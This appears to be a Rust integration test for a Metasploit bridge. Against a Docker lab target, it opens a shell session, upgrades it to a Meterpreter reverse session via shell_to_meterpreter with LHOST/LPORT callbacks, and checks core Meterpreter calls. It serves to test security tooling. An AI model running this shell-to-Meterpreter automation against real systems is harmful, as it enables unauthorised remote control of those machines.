// =============================================================================
// Integration Test: Meterpreter Client Core Operations
// =============================================================================
//
// This test CREATES a Meterpreter session by:
// 1. Connecting to the socat shell listener on target-linux:4445
// 2. Registering it as a CommandShell session
// 3. Upgrading to Meterpreter via shell_to_meterpreter post module
// 4. Testing Client Core operations (machine_id, native_arch, session_guid, etc.)
//
// Run with:
//   docker compose -f docker/docker-compose.yml run --rm integration-test \
//     cargo test --manifest-path rust/bridge/Cargo.toml --test test_client_core -- --nocapture
//
// IMPORTANT: This test requires the target-linux container to be running.
// The test will FAIL if it cannot create a Meterpreter session.
//
// =============================================================================

mod common;

use bridge::ruby_bridge;
use magnus::{value::ReprValue, Ruby, TryConvert, Value};
use std::{thread, time::Duration};

// =============================================================================
// Helper Functions (shared with test_transport.rs)
// =============================================================================

fn get_session_ids(framework: Value) -> Vec<i64> {
    let sessions =
        ruby_bridge::call_method(framework, "sessions", &[]).expect("Failed to get sessions");
    let session_keys =
        ruby_bridge::call_method(sessions, "keys", &[]).expect("Failed to get session keys");
    TryConvert::try_convert(session_keys).unwrap_or_else(|_| Vec::new())
}

fn wait_for_new_session(
    framework: Value,
    existing_sessions: &[i64],
    timeout_secs: u64,
) -> Option<i64> {
    for attempt in 0..timeout_secs {
        thread::sleep(Duration::from_secs(1));
        let current_sessions = get_session_ids(framework);
        for sid in &current_sessions {
            if !existing_sessions.contains(sid) {
                return Some(*sid);
            }
        }
        if attempt % 10 == 0 && attempt > 0 {
            println!("      Waiting for session... ({}s)", attempt);
        }
    }
    None
}

fn wait_for_meterpreter_session(
    ruby: &Ruby,
    framework: Value,
    existing_sessions: &[i64],
    timeout_secs: u64,
) -> Option<(i64, Value)> {
    let sessions_manager =
        ruby_bridge::call_method(framework, "sessions", &[]).expect("Failed to get sessions");

    for attempt in 0..timeout_secs {
        thread::sleep(Duration::from_secs(1));
        let current_sessions = get_session_ids(framework);
        for sid in &current_sessions {
            if existing_sessions.contains(sid) {
                continue;
            }
            let sid_val = ruby.integer_from_i64(*sid).as_value();
            let session_val = ruby_bridge::call_method(sessions_manager, "[]", &[sid_val])
                .expect("Failed to get session");
            let type_val = ruby_bridge::call_method(session_val, "type", &[])
                .expect("Failed to get type");
            let session_type = ruby_bridge::value_to_string(type_val).unwrap_or_default();
            if session_type.to_lowercase().contains("meterpreter") {
                return Some((*sid, session_val));
            }
        }
        if attempt % 15 == 0 && attempt > 0 {
            println!("      Waiting for Meterpreter session... ({}s)", attempt);
        }
    }
    None
}

fn kill_session(session: Value) {
    let _ = ruby_bridge::call_method(session, "kill", &[]);
}

fn create_shell_session(ruby: &Ruby, framework: Value, host: &str, port: u16) -> Result<(i64, Value), String> {
    let sessions_before = get_session_ids(framework);

    let rex_socket_tcp = ruby
        .eval::<Value>("Rex::Socket::Tcp")
        .map_err(|e| format!("Failed to get Rex::Socket::Tcp: {}", e))?;

    let opts = ruby.hash_new().as_value();
    ruby_bridge::call_method(opts, "[]=", &[
        ruby.str_new("PeerHost").as_value(),
        ruby.str_new(host).as_value()
    ]).map_err(|e| format!("Failed to set PeerHost: {}", e))?;
    ruby_bridge::call_method(opts, "[]=", &[
        ruby.str_new("PeerPort").as_value(),
        ruby.integer_from_i64(port as i64).as_value()
    ]).map_err(|e| format!("Failed to set PeerPort: {}", e))?;
    ruby_bridge::call_method(opts, "[]=", &[
        ruby.str_new("Timeout").as_value(),
        ruby.integer_from_i64(10).as_value()
    ]).map_err(|e| format!("Failed to set Timeout: {}", e))?;

    let socket = ruby_bridge::call_method(rex_socket_tcp, "create", &[opts])
        .map_err(|e| format!("Failed to create socket: {}", e))?;

    if socket.is_nil() {
        return Err("Socket connection failed".to_string());
    }

    let cmd_shell_class = ruby
        .eval::<Value>("Msf::Sessions::CommandShell")
        .map_err(|e| format!("Failed to get CommandShell class: {}", e))?;

    let session = ruby_bridge::call_method(cmd_shell_class, "new", &[socket])
        .map_err(|e| format!("Failed to create CommandShell: {}", e))?;

    ruby_bridge::call_method(session, "platform=", &[ruby.str_new("linux").as_value()])
        .map_err(|e| format!("Failed to set platform: {}", e))?;
    ruby_bridge::call_method(session, "arch=", &[ruby.str_new("x64").as_value()])
        .map_err(|e| format!("Failed to set arch: {}", e))?;
    ruby_bridge::call_method(session, "exploit_datastore=", &[ruby.hash_new().as_value()])
        .map_err(|e| format!("Failed to set exploit_datastore: {}", e))?;

    let sessions_manager = ruby_bridge::call_method(framework, "sessions", &[])
        .map_err(|e| format!("Failed to get sessions: {}", e))?;
    ruby_bridge::call_method(sessions_manager, "register", &[session])
        .map_err(|e| format!("Failed to register session: {}", e))?;

    thread::sleep(Duration::from_millis(500));

    let session_id = wait_for_new_session(framework, &sessions_before, 5)
        .ok_or_else(|| "Session not registered".to_string())?;

    Ok((session_id, session))
}

fn upgrade_to_meterpreter(
    ruby: &Ruby,
    framework: Value,
    _shell_session: Value,
    shell_session_id: i64,
    lhost: &str,
    lport: u16,
) -> Result<(i64, Value), String> {
    let sessions_before = get_session_ids(framework);

    println!("   Upgrading shell {} to Meterpreter (LHOST={}, LPORT={})",
             shell_session_id, lhost, lport);

    let modules = ruby_bridge::call_method(framework, "modules", &[])
        .map_err(|e| format!("Failed to get modules: {}", e))?;

    let module = ruby_bridge::call_method(
        modules, "create",
        &[ruby.str_new("post/multi/manage/shell_to_meterpreter").as_value()]
    ).map_err(|e| format!("Failed to create post module: {}", e))?;

    if module.is_nil() {
        return Err("shell_to_meterpreter module not found".to_string());
    }

    let datastore = ruby_bridge::call_method(module, "datastore", &[])
        .map_err(|e| format!("Failed to get datastore: {}", e))?;

    ruby_bridge::call_method(datastore, "[]=", &[
        ruby.str_new("SESSION").as_value(),
        ruby.integer_from_i64(shell_session_id).as_value()
    ]).map_err(|e| format!("Failed to set SESSION: {}", e))?;

    ruby_bridge::call_method(datastore, "[]=", &[
        ruby.str_new("LHOST").as_value(),
        ruby.str_new(lhost).as_value()
    ]).map_err(|e| format!("Failed to set LHOST: {}", e))?;

    ruby_bridge::call_method(datastore, "[]=", &[
        ruby.str_new("LPORT").as_value(),
        ruby.str_new(&lport.to_string()).as_value()
    ]).map_err(|e| format!("Failed to set LPORT: {}", e))?;

    ruby_bridge::call_method(datastore, "[]=", &[
        ruby.str_new("HANDLER").as_value(),
        ruby.str_new("true").as_value()
    ]).map_err(|e| format!("Failed to set HANDLER: {}", e))?;

    ruby_bridge::call_method(module, "setup", &[])
        .map_err(|e| format!("Failed to setup module: {}", e))?;
    let _ = ruby_bridge::call_method(module, "run", &[]);
    let _ = ruby_bridge::call_method(module, "cleanup", &[]);

    println!("   Waiting for Meterpreter session...");
    let (meterpreter_id, meterpreter_session) =
        wait_for_meterpreter_session(ruby, framework, &sessions_before, 90)
            .ok_or_else(|| "Meterpreter session did not connect within timeout".to_string())?;

    println!("   ✓ Got Meterpreter session: {}", meterpreter_id);
    Ok((meterpreter_id, meterpreter_session))
}

// =============================================================================
// Main Integration Test
// =============================================================================

#[test]
fn it_tests_meterpreter_client_core_operations() {
    let env = match common::require_integration_env() {
        Some(env) => env,
        None => return,
    };

    println!("\n{}", "=".repeat(60));
    println!(" Integration Test: Meterpreter Client Core Operations");
    println!("{}\n", "=".repeat(60));

    let (ruby, framework) = common::init_framework();

    let lhost = std::env::var("LHOST").unwrap_or_else(|_| {
        std::process::Command::new("hostname")
            .arg("-I")
            .output()
            .ok()
            .and_then(|o| String::from_utf8(o.stdout).ok())
            .map(|s| s.split_whitespace().next().unwrap_or("127.0.0.1").to_string())
            .unwrap_or_else(|| "127.0.0.1".to_string())
    });
    let lport: u16 = std::env::var("LPORT")
        .ok()
        .and_then(|s| s.parse().ok())
        .unwrap_or(4433);

    println!("🎯 Test Configuration:");
    println!("   Target: {}:{}", env.target_host, env.shell_port);
    println!("   Handler: {}:{}", lhost, lport);

    // Step 1: Create shell session
    println!("\n📍 Step 1: Creating shell session...");
    let (shell_session_id, shell_session) = match create_shell_session(
        &ruby, framework, &env.target_host, env.shell_port
    ) {
        Ok(result) => result,
        Err(e) => panic!("❌ Failed to create shell session: {}", e),
    };
    println!("   ✓ Shell session created: {}", shell_session_id);

    // Step 2: Upgrade to Meterpreter
    println!("\n📍 Step 2: Upgrading to Meterpreter...");
    let (meterpreter_id, meterpreter_session) = match upgrade_to_meterpreter(
        &ruby, framework, shell_session, shell_session_id, &lhost, lport
    ) {
        Ok(result) => result,
        Err(e) => {
            kill_session(shell_session);
            panic!("❌ Failed to upgrade to Meterpreter: {}", e);
        }
    };

    let session = bridge::Session::from_raw(meterpreter_session, meterpreter_id);

    // Step 3: Test Client Core operations
    println!("\n📍 Step 3: Testing Client Core Operations...");

    // Test: meterpreter_machine_id
    println!("\n--- Testing meterpreter_machine_id ---");
    match session.meterpreter_machine_id(None) {
        Ok(machine_id) => {
            println!("✓ meterpreter_machine_id() = {}", machine_id);
            if !machine_id.is_empty() {
                assert!(machine_id.len() == 32, "Machine ID should be 32 char MD5 hash");
            }
        }
        Err(e) => println!("⚠ meterpreter_machine_id() failed: {}", e),
    }

    // Test: meterpreter_native_arch
    println!("\n--- Testing meterpreter_native_arch ---");
    match session.meterpreter_native_arch(None) {
        Ok(arch) => {
            println!("✓ meterpreter_native_arch() = {}", arch);
            if !arch.is_empty() {
                assert!(
                    arch.contains("x86") || arch.contains("x64") ||
                    arch.contains("arm") || arch.contains("aarch"),
                    "Architecture should be a known type"
                );
            }
        }
        Err(e) => {
            // x86/linux Meterpreter doesn't support native_arch - this is expected
            if e.to_string().to_lowercase().contains("not supported") {
                println!("⚠ native_arch not supported on this Meterpreter type (expected for x86/linux)");
            } else {
                println!("⚠ meterpreter_native_arch() failed: {}", e);
            }
        }
    }

    // Test: meterpreter_session_guid
    println!("\n--- Testing meterpreter_session_guid ---");
    match session.meterpreter_session_guid(None) {
        Ok(guid) => {
            println!("✓ meterpreter_session_guid() = {}", guid);
            if !guid.is_empty() {
                assert!(guid.chars().all(|c| c.is_ascii_hexdigit()), "GUID should be hex string");
            }
        }
        Err(e) => println!("⚠ meterpreter_session_guid() failed: {}", e),
    }

    // Test: meterpreter_use (load stdapi)
    println!("\n--- Testing meterpreter_use ---");
    match session.meterpreter_use("stdapi") {
        Ok(loaded) => {
            println!("✓ meterpreter_use('stdapi') = {}", loaded);
        }
        Err(e) => {
            println!("⚠ meterpreter_use('stdapi') failed (may already be loaded): {}", e);
        }
    }

    // Test: meterpreter_secure
    println!("\n--- Testing meterpreter_secure ---");
    match session.meterpreter_secure() {
        Ok(secured) => {
            println!("✓ meterpreter_secure() = {}", secured);
        }
        Err(e) => println!("⚠ meterpreter_secure() failed: {}", e),
    }

    // Skip destructive tests
    println!("\n--- Skipping destructive tests ---");
    println!("⚠ Skipping meterpreter_shutdown() - would terminate session");
    println!("⚠ Skipping meterpreter_migrate() - would alter session (Windows only)");

    // Cleanup
    println!("\n📍 Step 4: Cleanup...");
    kill_session(meterpreter_session);

    println!("\n{}", "=".repeat(60));
    println!(" ✅ Client Core Test PASSED");
    println!("{}\n", "=".repeat(60));
}
